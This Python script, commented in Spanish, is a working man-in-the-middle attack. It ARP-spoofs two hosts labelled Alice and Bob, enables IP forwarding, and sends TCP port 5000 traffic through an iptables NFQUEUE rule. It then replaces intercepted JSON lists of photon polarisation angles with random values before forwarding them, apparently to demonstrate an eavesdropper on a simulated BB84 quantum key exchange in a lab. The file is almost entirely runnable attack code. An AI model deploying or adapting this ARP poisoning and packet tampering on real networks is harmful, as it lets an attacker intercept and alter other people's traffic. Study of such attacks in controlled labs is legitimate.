import netfilterqueue
from scapy.all import IP, TCP, Raw, ARP, Ether, sendp
import json
import os
import threading
import time
import random
import logging


logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


IP_ALICE = "192.168.118.136"
IP_BOB = "192.168.118.137"
MAC_ALICE = "00:0c:29:02:90:f3"
MAC_BOB = "00:0c:29:d0:99:c9"
INTERFAZ = "eth0" 

def arp_spoof():
    print(f"[ARP] Iniciando envenenamiento entre Alice({IP_ALICE}) y Bob({IP_BOB})")
    
    paquete_de_alice = Ether(dst=MAC_ALICE)/ARP(op=2, pdst=IP_ALICE, psrc=IP_BOB, hwdst=MAC_ALICE)
    paquete_de_bob = Ether(dst=MAC_BOB)/ARP(op=2, pdst=IP_BOB, psrc=IP_ALICE, hwdst=MAC_BOB)
    
    while True:
        try:
            sendp(paquete_de_alice, iface=INTERFAZ, verbose=False)
            sendp(paquete_de_bob, iface=INTERFAZ, verbose=False)
            time.sleep(2)
        except Exception as e:
            print(f"Error en ARP: {e}")
            break

def procesar_paquete(packet):
    try:
        payload_raw = packet.get_payload()
        paquete_scapy = IP(payload_raw)
        
        if paquete_scapy.haslayer(TCP) and paquete_scapy[TCP].dport == 5000:
            
            if paquete_scapy.haslayer(Raw):
                payload_data = paquete_scapy[Raw].load.decode('utf-8', errors='ignore')
                
                if "[" in payload_data and "]" in payload_data:
                    print("Paquetes inteceptados!!!!!!!!!!!!!")
                    
                    try:
                        fotones = json.loads(payload_data)
                        alterados = [random.choice([0, 90, 45, 135]) for _ in fotones]
                        
                        nuevo_contenido = json.dumps(alterados).encode()                       
                        original_len = len(paquete_scapy[Raw].load)
                        print(f"\n{nuevo_contenido}")
                        
                        paquete_scapy[Raw].load = nuevo_contenido
                        
                        del paquete_scapy[IP].len
                        del paquete_scapy[IP].chksum
                        del paquete_scapy[TCP].chksum
                        
                        packet.set_payload(bytes(paquete_scapy))
                        print("\nEstados cuánticos alterados y reenviados a Bob.")
                    except Exception as e:
                        print(f"\nError: {e}")

        packet.accept()

    except Exception as e:

        packet.accept()

def configurar_sistema():
    print("\nConfigurando intercepción y reglas de iptables")
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null")
    os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 > /dev/null")
    os.system("sysctl -w net.ipv4.conf.eth0.send_redirects=0 > /dev/null")
    
    os.system("iptables -F -t mangle")

    os.system("iptables -t mangle -A FORWARD -p tcp --dport 5000 -j NFQUEUE --queue-num 1")

if __name__ == "__main__":
    configurar_sistema()
    
    hilo_arp = threading.Thread(target=arp_spoof, daemon=True)
    hilo_arp.start()

    nfqueue = netfilterqueue.NetfilterQueue()
    try:
        nfqueue.bind(1, procesar_paquete)
        print("Escuchando...")
        nfqueue.run()
    except KeyboardInterrupt:
        print("\nFinalizando y limpiando iptables")
        print("sudo iptables -F -t mangle")
        os.system("iptables -F -t mangle")